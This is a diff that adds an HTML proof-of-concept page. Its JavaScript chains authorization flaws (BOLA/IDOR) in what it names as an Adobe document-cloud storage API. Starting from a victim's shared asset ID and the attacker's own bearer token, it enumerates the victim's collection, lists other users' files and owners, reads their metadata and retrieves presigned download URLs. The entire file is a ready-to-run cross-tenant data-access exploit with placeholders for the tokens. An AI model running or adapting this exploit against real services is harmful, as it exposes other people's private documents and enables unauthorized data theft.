@@ -1,0 +1,96 @@
+<!DOCTYPE html><html><head><title>PoC</title></head>
+<body>
+<div id="r" style="font-family:monospace;font-size:4px;white-space:pre-wrap;word-break:break-all;max-width:800px;line-height:1.0;"></div>
+<script>
+const R=document.getElementById('r');
+function log(m){R.textContent+=m+'\n';}
+
+// ========== UPDATE THESE 3 VALUES ==========
+const TOKEN='PASTE_YOUR_BEARER_TOKEN_HERE';
+const ATTACKER_ACCT='YOUR_NUMERIC_ACCOUNT_ID';
+const SEED_URN='urn:aaid:sc:US:VICTIM_ASSET_UUID_FROM_SHARED_LINK';
+// ============================================
+
+const KEY='dc-prod-virgoweb';
+const E='https://platform-cs-edge-va6.adobe.io';
+
+function xhr(url,accept){
+  try{
+    var x=new XMLHttpRequest();
+    x.open('GET',url,false);
+    x.setRequestHeader('Authorization','Bearer '+TOKEN);
+    x.setRequestHeader('x-api-key',KEY);
+    x.setRequestHeader('Accept',accept||'application/json');
+    x.send();
+    return {s:x.status,t:x.responseText};
+  }catch(e){return {s:0,t:'ERR:'+e.message};}
+}
+
+try{
+log('=== SSRF CROSS-TENANT CHAIN ===');
+log('Time: '+new Date().toISOString());
+log('Attacker: '+ATTACKER_ACCT);
+log('Seed: '+SEED_URN);
+
+log('\n--- STEP 1: BOLA repometadata -> collection UUID ---');
+var r1=xhr(E+'/content/storage/id/'+SEED_URN+'/:repometadata');
+log('status:'+r1.s);
+if(r1.s==200){
+  var j1=JSON.parse(r1.t);
+  var ancestors=j1['repo:ancestors']||[];
+  var info=j1['repo:ancestorInfo']||{};
+  log('ancestors:'+JSON.stringify(ancestors));
+  var collUrn=null;
+  for(var i=0;i<ancestors.length;i++){
+    if(info[ancestors[i]]&&info[ancestors[i]]['repo:assetType']==='pdf-space'){collUrn=ancestors[i];break;}
+  }
+  log('COLLECTION: '+collUrn);
+  log('owner: '+j1['repo:createdBy']);
+
+  if(collUrn){
+    log('\n--- STEP 2: IDOR enumerate victim assets ---');
+    var r2=xhr(E+'/dccreation/'+ATTACKER_ACCT+'/creations?publicId=kwc_curated&kwcollection_id='+collUrn,
+      'application/vnd.adobe.dc+json;profile="https://platform-cs-edge.adobe.io/dccreation/schemas/kwcollection_creations_listing_v1.json"');
+    log('status:'+r2.s);
+    if(r2.s==200){
+      var j2=JSON.parse(r2.t);
+      var assets=j2.children||[];
+      log('assets_found:'+assets.length);
+      for(var a=0;a<assets.length;a++){
+        log('ASSET['+a+']: '+assets[a].name+' | type:'+assets[a].type+' | owner:'+assets[a].created_by+' | '+assets[a].creation_id);
+      }
+
+      log('\n--- STEP 3: BOLA read victim metadata ---');
+      for(var b=0;b<Math.min(assets.length,3);b++){
+        try{
+          var r3=xhr(E+'/content/storage/id/'+assets[b].creation_id);
+          log('['+assets[b].name+'] status:'+r3.s);
+          if(r3.s==200){
+            try{var j3=JSON.parse(r3.t);
+            log(' size:'+j3['dc:format:file:size']+' modified:'+j3['repo:modifyDate']+' createdBy:'+j3['repo:createdBy']);}
+            catch(pe){log(' (non-JSON) '+r3.t.substring(0,150));}
+          }else{log(' '+r3.t.substring(0,150));}
+        }catch(e3){log('['+assets[b].name+'] ERR:'+e3.message);}
+      }
+
+      log('\n--- STEP 4: BOLA get presigned download URLs ---');
+      for(var c=0;c<Math.min(assets.length,3);c++){
+        try{
+          var r4=xhr(E+'/content/storage/id/'+assets[c].creation_id+'/:block_download','*/*');
+          log('['+assets[c].name+'] dl status:'+r4.s);
+          if(r4.s==200){
+            try{var j4=JSON.parse(r4.t);
+            log(' S3:'+(j4.href||'').substring(0,120)+'...');
+            log(' size:'+j4.size+' type:'+j4.type);}
+            catch(pe){log(' (non-JSON) '+r4.t.substring(0,100));}
+          }else{log(' '+r4.t.substring(0,150));}
+        }catch(e4){log('['+assets[c].name+'] ERR:'+e4.message);}
+      }
+    }else{log('IDOR resp:'+r2.t.substring(0,300));}
+  }
+}else{log('repometa resp:'+r1.t.substring(0,300));}
+
+log('\n=== CHAIN COMPLETE ===');
+}catch(e){log('FATAL:'+e.message);}
+</script>
+</body></html>
